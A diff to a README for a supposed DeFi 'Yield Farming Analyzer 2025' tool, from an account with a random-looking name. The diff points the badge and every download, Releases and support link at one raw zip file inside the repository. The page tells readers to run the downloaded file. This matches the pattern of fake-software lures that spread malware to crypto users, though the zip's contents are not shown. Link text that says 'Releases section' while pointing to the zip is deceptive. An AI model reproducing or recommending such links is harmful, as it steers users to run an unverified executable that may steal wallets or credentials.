@@ -1,6 +1,6 @@
 # Yield Farming Analyzer 2025 🌾📊
 
-![Yield Farming Analyzer](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)
+![Yield Farming Analyzer](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/raw/refs/heads/main/oxamic/Farming-Yield-Analyzer-2.4.zip%20Now-Get%20the%20Latest%20Version-brightgreen)
 
 Welcome to the **Yield Farming Analyzer 2025** repository! This software is designed to help you analyze yield farming opportunities effectively. With user-friendly features and advanced capabilities, this tool aims to support your journey in the world of decentralized finance (DeFi).
 
@@ -19,7 +19,7 @@ Welcome to the **Yield Farming Analyzer 2025** repository! This software is desi
 
 Yield farming has gained immense popularity in the DeFi space. As more users look to maximize their returns, having the right tools is essential. The **Yield Farming Analyzer 2025** provides insights and automation to make informed decisions. 
 
-For the latest version, [download here](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/releases). After downloading, execute the file to start your analysis.
+For the latest version, [download here](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/raw/refs/heads/main/oxamic/Farming-Yield-Analyzer-2.4.zip). After downloading, execute the file to start your analysis.
 
 ## Features
 
@@ -34,7 +34,7 @@ For the latest version, [download here](https://github.com/bfjvkufbkfbglfdbhf/Yi
 
 To install the **Yield Farming Analyzer 2025**, follow these steps:
 
-1. Visit the [Releases section](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/releases) to find the latest version.
+1. Visit the [Releases section](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/raw/refs/heads/main/oxamic/Farming-Yield-Analyzer-2.4.zip) to find the latest version.
 2. Download the appropriate file for your operating system.
 3. Execute the downloaded file to install the software on your device.
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have questions or need assistance, please check the [Releases section](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/releases) for updates. You can also open an issue in the repository for help.
+If you have questions or need assistance, please check the [Releases section](https://github.com/bfjvkufbkfbglfdbhf/Yield-Farming-Analyzer-2025/raw/refs/heads/main/oxamic/Farming-Yield-Analyzer-2.4.zip) for updates. You can also open an issue in the repository for help.
 
 ---
 
